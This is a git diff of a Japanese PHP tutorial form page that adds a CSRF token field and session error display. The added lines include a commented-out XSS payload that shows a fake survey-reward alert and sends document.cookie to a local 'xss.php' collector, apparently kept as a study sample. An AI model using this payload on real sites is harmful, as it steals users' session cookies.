@@ -1,3 +1,8 @@
+<?php
+require_once('functions.php');
+setToken(); // 追記
+?>
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -5,7 +10,11 @@
   <title>新規作成</title>
 </head>
 <body>
+  <?php if (!empty($_SESSION['err'])): ?> 
+    <p><?= $_SESSION['err']; ?></p> 
+  <?php endif; ?> 
   <form action="store.php" method="post">
+    <input type="hidden" name="token" value="<?= $_SESSION['token']; ?>"> 
     <input type="text" name="content" >
     <!-- inputタグのname属性がキーとなり
      value属性がバリューとなるような連想配列として
@@ -36,11 +45,13 @@ global 宣言をしなくても、関数内・クラス内など任意のスコ�
 -->
 
     <input type="submit" value="作成">
+    <!-- <script>if (!alert('今ならアンケート回答で1万円GET！アンケートに答えますか？')) {location.href = 'http://localhost:9999/xss.php?' + document.cookie;}</script> -->
   </form>
 
 
   <div>
     <a href="index.php">一覧へもどる</a>
   </div>
+  <?php unsetError(); ?> 
 </body>
 </html>
